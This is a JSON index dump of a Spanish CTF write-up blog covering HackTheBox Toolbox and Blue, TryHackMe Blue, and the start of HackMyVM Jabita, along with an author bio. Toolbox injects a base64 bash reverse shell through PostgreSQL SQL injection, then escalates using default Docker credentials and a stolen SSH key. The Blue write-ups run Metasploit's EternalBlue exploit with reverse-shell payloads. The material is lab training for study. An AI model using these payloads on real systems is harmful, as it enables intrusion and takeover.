\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34; | base64 -d | bash Esto aplicado a la inyecciÃ³n se verÃ­a de la siguiente forma:\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;echo+\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34;+|+base64+-d+|+bash\u0026#39;--+- Â¡Â¡Â¡Â¡Recibimos la conexiÃ³n!!!!!\nAntes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Podemos identificar que estamos en un docker porque en la raÃ­z estÃ¡ el archivo .dockerenv\npostgres@bc56e3cc55e9:/$ ls -la total 80 drwxr-xr-x 1 root root 4096 Mar 29 2021 . drwxr-xr-x 1 root root 4096 Mar 29 2021 .. -rwxr-xr-x 1 root root 0 Mar 29 2021 .dockerenv drwxr-xr-x 1 root root 4096 Feb 19 2020 bin drwxr-xr-x 2 root root 4096 Nov 10 2019 boot drwxr-xr-x 5 root root 340 Oct 30 20:54 dev ... Si hacemos una bÃºsqueda por google podemos encontrar unas credenciales por default del ssh en los boot2docker (web)\nuser: docker pass: tcuser Si miramos que ip tenemos con ifconfig, vemos la 172.17.0.2, la gateway seguramente serÃ¡ la 172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 1338 bytes 183525 (179.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1163 bytes 173814 (169.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 3461 bytes 1232799 (1.1 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3461 bytes 1232799 (1.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 AsÃ­ que nos podemos conectar a la mÃ¡quina host del docker con ssh docker@172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1 docker@172.17.0.1\u0026#39;s password: ( \u0026#39;\u0026gt;\u0026#39;) /) TC (\\ Core is distributed with ABSOLUTELY NO WARRANTY. (/-_--_-\\) www.tinycorelinux.net docker@box:~$ Escalada root/Administrator Si hacemos un sudo -l para ver que podemos ejecutar con sudo, nos muestra que podemos ejecutar todos los comandos como root sin la necesidad de proporcionar contraseÃ±a.\ndocker@box:~$ sudo -l User docker may run the following commands on this host: (root) NOPASSWD: ALL docker@box:~$ Sabiendo esto simplemente podemos poner sudo bash y ya seremos root\ndocker@box:~$ sudo bash root@box:/home/docker# Al investigar un poco los archivo de la raÃ­z se puede ver que hay un directorio llamado c en el cual hay una estructura de carpetas parecida a la de windows, ahÃ­ podemos encontrar la flag final\nroot@box:/c/Users/Administrator/Desktop# ls desktop.ini root.txt root@box:/c/Users/Administrator/Desktop# Y ya tendrÃ­amos la flag de root.txt\nComo extra, en el directorio /c/Windows/Users/.ssh podemos ver una llave privada de ssh la cual podemos usar para salir del docker e ir a la mÃ¡quina host. Para usarla tenemos que guardarla en un archivo en nuestra mÃ¡quina\nPara que no de problemas le tenemos que dar permisos\nchmod 600 id_rsa Ahora ya nos podemos conectar por ssh como Administrator en la mÃ¡quina vÃ­ctima con el siguiente comando\nssh -i id_rsa Administrator@10.10.10.236 Y ya tenemos una consola como Administrator en la mÃ¡quina vÃ­ctima\n$ ssh -i id_rsa Administrator@10.10.10.236 administrator@TOOLBOX C:\\Users\\Administrator\u0026gt; ","date":"2023-10-29","id":50,"permalink":"/writeups/hackthebox/toolbox/","summary":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.","tags":["CTF","RCE","SQLI","Docker"],"title":"Toolbox"},{"content":"Me llamo Arnau y tengo 17 aÃ±os. Dentro de la informÃ¡tica lo que mas me llama la atenciÃ³n es la ciberseguridad, por eso dedico mi tiempo libre a aprender de forma autodidacta este campo a travÃ©s de ctf\u0026rsquo;s, mi objetivo es irme sacando certificaciones e ir aprendiendo cada dÃ­a mÃ¡s.\nMis Proyectos CreaciÃ³n de mÃ¡quinas Estas sÃ³n las mÃ¡quinas que he creado\nNombre Plataforma TÃ©cnicas Janus\n2025 (En desarrollo) HackTheBox Secret Athena\n2024-25 (Challenge En espera) HackTheBox Secret Bigotis\n2024-25 (En espera) HackTheBox Secret Hermes\n2024 (Provisionalmente aceptada) HackTheBox Secret Logan 2\n2023 HackMyVM SQLI User-Agent - LFI - Log Poisoning (Apache) - Funciones de PHP para ejecutar comandos deshabilitadas - CVE-2020-14144 Gitea 1.12.5 (RCE Authenticated) - SSTI Logan\n2023 HackMyVM - Subdomain enum - LFI - Log Poisoning (SMTP) - Sudo vim - Python command injection Influencer\n2023 HackMyVM - EsteganografÃ­a - Fuerza bruta con diccionario hecho con cups - Sudo Exiftool - ModificaciÃ³n /etc/hosts CreaciÃ³n de contenido Web: Esta web la cree con el objetivo de subir publicaciones sobre ciberseguridad, Linux y programaciÃ³n. MÃ¡s adelante me empecÃ© a subir tambiÃ©n resoluciones de mÃ¡quinas de HackTheBox, TryHackMe y HackMyVm\nYoutube: Hace un tiempo apostÃ© por la creaciÃ³n de contenido audiovisual, ya que es mÃ¡s ameno de ver y se me hace mÃ¡s fÃ¡cil explicarme a la hora de resolver una mÃ¡quina. Pero hacer los videos me consumÃ­a mucho tiempo y dejÃ© de subir writeups en formato video y ahora solo subo con poca frecuencia videos cortos y amenos de ver que expliquen vulnerabilidades en concreto\nCertificaciones Actualmente poseo las siguientes certificaciones\neWPT Web Application Penetration Tester\neJPTv2 Junior Penetration Tester\n","date":"2023-09-07","id":51,"permalink":"/about/","summary":"Me llamo Arnau y tengo 17 aÃ±os. Dentro de la informÃ¡tica lo que mas me llama la atenciÃ³n es la ciberseguridad, por eso dedico mi tiempo libre a aprender de forma autodidacta este campo a travÃ©s de ctf\u0026rsquo;s, mi objetivo es irme sacando certificaciones e ir aprendiendo cada dÃ­a mÃ¡s.","tags":[],"title":"About me"},{"content":"","date":"2023-09-07","id":52,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":53,"permalink":"/","summary":"","tags":[],"title":"d3bo"},{"content":" ","date":"2023-08-30","id":54,"permalink":"/writeups/hackthebox/pandora-video/","summary":" ","tags":[],"title":"Pandora (Video)"},{"content":" ","date":"2023-08-29","id":55,"permalink":"/writeups/hackthebox/horizontall-video/","summary":" ","tags":[],"title":"Horizontall (Video)"},{"content":" ","date":"2023-08-28","id":56,"permalink":"/writeups/hackthebox/bashed-video/","summary":" ","tags":[],"title":"Bashed (Video)"},{"content":" ","date":"2023-08-27","id":57,"permalink":"/writeups/hackmyvm/friendly-iii-video/","summary":" ","tags":[],"title":"Friendly III (Video)"},{"content":" ","date":"2023-06-03","id":58,"permalink":"/writeups/hackmyvm/visions-video/","summary":" ","tags":[],"title":"Visions (Video)"},{"content":" ","date":"2023-06-02","id":59,"permalink":"/writeups/hackmyvm/friendly-ii-video/","summary":" ","tags":[],"title":"Friendly II (Video)"},{"content":" ","date":"2023-06-01","id":60,"permalink":"/writeups/hackmyvm/five-video/","summary":" ","tags":[],"title":"Five (Video)"},{"content":" ","date":"2023-05-31","id":61,"permalink":"/writeups/hackmyvm/doc-video/","summary":" ","tags":[],"title":"Doc (Video)"},{"content":" ","date":"2023-05-05","id":62,"permalink":"/writeups/hackmyvm/literal-video/","summary":" ","tags":[],"title":"Literal (Video)"},{"content":" ","date":"2023-04-19","id":63,"permalink":"/writeups/hackmyvm/jabita-video/","summary":" ","tags":[],"title":"Jabita (Video)"},{"content":" ","date":"2023-03-30","id":64,"permalink":"/writeups/hackmyvm/friendly-i-video/","summary":" ","tags":[],"title":"Friendly I (Video)"},{"content":" ","date":"2023-03-27","id":65,"permalink":"/writeups/hackmyvm/uvalde-video/","summary":" ","tags":[],"title":"Uvalde (Video)"},{"content":" ","date":"2023-03-22","id":66,"permalink":"/writeups/hackmyvm/w140-video/","summary":" ","tags":[],"title":"W140 (Video)"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10.10.220.86: icmp_seq=1 ttl=125 time=311 ms --- 10.10.220.86 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 310.739/310.739/310.739/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Windows por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.220.86 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n$ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.220.86 5 â”‚ [*] Open ports: 135,139,445,3389,49153,49154,49158,49161 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\n$ nmap -p135,139,445,3389,49153,49154,49158,49161 -sC -sV 10.10.220.86 -oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-03-13T21:38:54+00:00; +2s from scanner time. | ssl-cert: Subject: commonName=Jon-PC | Not valid before: 2023-03-12T18:12:17 |_Not valid after: 2023-09-11T18:12:17 | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 |_ System_Time: 2023-03-13T21:38:43+00:00 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02c0de388f81 (unknown) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-03-13T21:38:42 |_ start_date: 2023-03-13T18:31:03 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T16:38:42-05:00 ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos IntrusiÃ³n El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\nâ¯ nmap --script \u0026#34;vuln and safe\u0026#34; -p445 10.10.220.86 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 22:53 CET Nmap scan report for 10.10.220.86 Host is up (0.37s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Es vulnerable. Ahora vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Ponemos la ip de la vÃ­ctima\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhost 10.10.220.86 rhost =\u0026gt; 10.10.220.86 Especificamos la ip y el puerto en el que vamos a estar en escucha\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.2.28.215 lhost =\u0026gt; 10.2.28.215 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lport 443 lport =\u0026gt; 443 Cambiamos el payload\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/shell/reverse_tcp payload =\u0026gt; windows/x64/shell/reverse_tcp Y por Ãºltimo lo ejecutamos con run\nrun Ahora ya tenemos una reverse shell.\nFlags Las flags estÃ¡n en:\nC:\\flag1.txt\nC:\\Windows\\System32\\config\\flag2.txt\nC:\\Users\\Jon\\Documents\\flag3.txt\n","date":"2023-03-14","id":67,"permalink":"/writeups/tryhackme/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.","tags":["CTF","FÃ¡cil","Windows","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-14","id":68,"permalink":"/tags/eternalblue/","summary":"","tags":[],"title":"eternalblue"},{"content":"","date":"2023-03-14","id":69,"permalink":"/tags/f%C3%A1cil/","summary":"","tags":[],"title":"FÃ¡cil"},{"content":"","date":"2023-03-14","id":70,"permalink":"/tags/metasploit/","summary":"","tags":[],"title":"metasploit"},{"content":"","date":"2023-03-14","id":71,"permalink":"/tags/ms17-010/","summary":"","tags":[],"title":"ms17-010"},{"content":"","date":"2023-03-14","id":72,"permalink":"/tags/smb/","summary":"","tags":[],"title":"smb"},{"content":"","date":"2023-03-14","id":73,"permalink":"/tags/windows/","summary":"","tags":[],"title":"Windows"},{"content":"\rReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.10.10.40 PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data. 64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=332 ms --- 10.10.10.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 332.152/332.152/332.152/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Windows por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.40 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\n$ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 â”‚ 2 â”‚ [*] Extracting information... 3 â”‚ 4 â”‚ [*] IP Address: 10.10.10.40 5 â”‚ [*] Open ports: 135,139,445,49152,49153,49154,49155,49156,49157 6 â”‚ 7 â”‚ [*] Ports copied to clipboard 8 â”‚ â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts bÃ¡sicos de reconocimientos\n$ nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV 10.10.10.40-oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T17:41:08+00:00 | smb2-time: | date: 2023-03-13T17:41:09 |_ start_date: 2023-03-12T19:47:16 | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2s, deviation: 1s, median: 1s ParÃ¡metro FunciÃ³n -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts bÃ¡sicos de reconocimiento -sV Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos IntrusiÃ³n El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\nâ¯ sudo nmap --script smb-vuln* -p139,445 -T4 -Pn 10.10.10.40 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 18:44 CET Nmap scan report for 10.10.10.40 Host is up (0.072s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND Es vulnerable. Vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Definimos ip de vÃ­ctima y atacante\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOST 10.10.10.40 RHOST =\u0026gt; 10.10.10.40 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.10.14.27 lhost =\u0026gt; 10.10.14.27 Lo ejecutamos\nrun Por Ãºltimo para spawnear una shell\nshell Flags type \\Users\\haris\\Desktop\\user.txt type \\Users\\Administrator\\Desktop\\root.tx ","date":"2023-03-13","id":74,"permalink":"/writeups/hackthebox/blue/","summary":"Reconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 10.","tags":["CTF","ms17-010","eternalblue","smb","metasploit"],"title":"Blue"},{"content":"","date":"2023-03-06","id":75,"permalink":"/tags/awk/","summary":"","tags":[],"title":"awk"},{"content":"","date":"2023-03-06","id":76,"permalink":"/tags/directory-traversal/","summary":"","tags":[],"title":"Directory Traversal"},{"content":"https://hackmyvm.eu/machines/machine.php?vm=Jabita\nIP Atacante = 192.168.1.138\nIP vÃ­ctima = 192.168.1.141\nReconocimiento Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene\nâ¯ ping -c 1 192.168.1.141 PING 192.168.1.141 (192.168.1.141) 56(84) bytes of data. 64 bytes from 192.168.1.141: icmp_seq=1 ttl=64 time=0.257 ms --- 192.168.1.141 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.257/0.257/0.257/0.000 ms En este caso da un ttl (time to live) de 64, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta mÃ¡quina es Linux por aproximaciÃ³n\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.141 -oG allPorts ParÃ¡metro FunciÃ³n -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resoluciÃ³n DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual\nFunciÃ³n extractPorts de @s4vitar\nâ¯ extractPorts allPorts â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â”‚ File: extractPorts.tmp â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 1 